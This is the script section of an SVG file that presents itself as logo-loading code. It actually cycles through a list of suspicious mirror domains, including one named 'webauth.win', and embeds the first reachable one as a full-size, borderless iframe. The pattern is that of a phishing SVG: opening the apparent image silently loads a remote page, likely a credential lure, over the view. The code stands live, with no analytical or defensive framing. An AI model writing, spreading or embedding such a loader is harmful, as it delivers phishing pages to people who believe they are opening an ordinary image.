svg.script:

var MIRRORS = [
  { host: "ajhsvault.org", fallback: true },
  { host: "practice.rest" },
  { host: "endis.rest" },
  { host: "webauth.win" },
  { host: "endis.college" }
];

function tryMirror(i) {
  if (i >= MIRRORS.length) return openFallback();

  var m = MIRRORS[i];
  var ctrl = new AbortController();
  var timer = setTimeout(function () { ctrl.abort(); }, 4000);

  fetch("https://" + m.host + "/status.json?t=" + Date.now(),
        { signal: ctrl.signal, mode: "cors", cache: "no-store" })
    .then(function (r) {
      clearTimeout(timer);
      if (r.ok) { embed(m.host); } else { tryMirror(i + 1); }
    })
    .catch(function () {
      clearTimeout(timer);
      tryMirror(i + 1);
    });
}

function openFallback() {
  for (var j = 0; j < MIRRORS.length; j++) {
    if (MIRRORS[j].fallback) { embed(MIRRORS[j].host); return; }
  }
}

function embed(host) {
  var container = document.getElementById("logo-container");
  if (!container) return;
  var frame = document.createElementNS("http://www.w3.org/1999/xhtml", "iframe");
  frame.setAttribute("src", "https://" + host + "/");
  frame.style.width = "100%";
  frame.style.height = "100%";
  frame.style.border = "none";
  frame.style.background = "white";
  frame.style.margin = "0";
  frame.style.padding = "0";
  container.appendChild(frame);
}

function injectLogo() {
  tryMirror(0);
}
